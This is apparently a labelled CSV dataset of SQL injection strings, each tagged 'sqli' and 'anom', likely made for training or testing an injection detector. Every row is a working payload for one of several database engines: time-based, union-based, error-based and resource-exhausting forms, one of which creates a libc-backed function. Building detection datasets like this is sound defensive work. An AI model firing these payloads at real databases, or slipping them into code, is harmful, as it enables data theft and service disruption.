Query,Length,Attack,Label
"1' where 6406=6406;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",115,sqli,anom
"1) and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and (4666=4666",111,sqli,anom
-3136%') or 3400=6002,21,sqli,anom
1) where 7956=7956 or sleep(5)#,31,sqli,anom
-7387'))) order by 1--,22,sqli,anom
1')) as gfzb where 7904=7904;begin dbms_lock.sleep(5); end--,60,sqli,anom
"1))) union all select null,null,null#",37,sqli,anom
"-5622"" where 7970=7970 union all select 7970,7970,7970,7970,7970--",66,sqli,anom
"1"")) and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ((""smnw"" like ""smnw",227,sqli,anom
"-9860%"" union all select 6996,6996,6996,6996,6996,6996#",55,sqli,anom
"1));select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and ((7240=7240",101,sqli,anom
-2604)) as sekb where 6897=6897 or 1000=7683,44,sqli,anom
"1%""))) waitfor delay '0:0:5'--",30,sqli,anom
"1"") as nraw where 7984=7984 and elt(3114=3114,sleep(5))#",56,sqli,anom
1');begin dbms_lock.sleep(5); end and ('jzlr'='jzlr,51,sqli,anom
"1%"");select benchmark(5000000,md5(0x714e4153))#",47,sqli,anom
"1'))) or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",103,sqli,anom
"1%"")));create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5) and (((""%""=""",134,sqli,anom
"-4259')) as usqu where 5419=5419 or elt(8325=8837,8837)--",57,sqli,anom
"1')) and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and (('ijyi'='ijyi",124,sqli,anom
-1638' or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and 'xkne'='xkne,203,sqli,anom
"-2583"") where 3455=3455 or make_set(9354=9354,7185)--",53,sqli,anom
"-6267""))) or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (((""rqws""=""rqws",209,sqli,anom
"1%"";call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",104,sqli,anom
"1%'))) and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",69,sqli,anom
"-3885) where 2387=2387 union all select 2387,2387,2387,2387,2387,2387,2387#",75,sqli,anom
1'+(select 'gmpn' where 8137=8137 or sleep(5))+',48,sqli,anom
"-4182)) as wkfh where 6145=6145 union all select 6145,6145,6145,6145,6145#",74,sqli,anom
"1"" union all select null#",25,sqli,anom
"1') as zdhq where 5586=5586;select like('abcdefg',upper(hex(randomblob(500000000/2))))--",88,sqli,anom
1' where 8584=8584 order by 1#,30,sqli,anom
"1') and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)",100,sqli,anom
1')) as plbt where 4368=4368 and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)--,262,sqli,anom
1'));select (case when (8601=1220) then 8601 else 8601*(select 8601 from mysql.db) end)#,88,sqli,anom
"1"" or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666) and ""ekjs"" like ""ekjs",115,sqli,anom
"1'||(select 'frrk' from dual where 3145=3145 and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)))||'",138,sqli,anom
"1"")) or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",66,sqli,anom
"1%"") or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and (""%""=""",120,sqli,anom
1 and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric),188,sqli,anom
"1""))) or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and (((""abcw""=""abcw",175,sqli,anom
"1%'));select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and (('%'='",99,sqli,anom
1'))) and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((('njge' like 'njge,211,sqli,anom
"1') where 7007=7007 or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--",95,sqli,anom
"1""))) and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and (((""gfwz""=""gfwz",181,sqli,anom
"1)) as pjjz where 8384=8384 and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71))--",119,sqli,anom
"1%"")) order by 1#",17,sqli,anom
1));select (case when (3855=3855) then 3855 else 1/(select 0) end)--,68,sqli,anom
-6165%')) union all select 5384#,32,sqli,anom
"1);select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--",93,sqli,anom
"1) or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",111,sqli,anom
"-2122"") as zytb where 7025=7025 or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--",235,sqli,anom
"1) as nsdy where 7513=7513;select * from generate_series(3267,3267,case when (3267=5900) then 1 else 0 end) limit 1--",117,sqli,anom
1) as imdt where 6431=6431;begin user_lock.sleep(5); end--,58,sqli,anom
1')) as eltx where 9955=9955 and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)--,217,sqli,anom
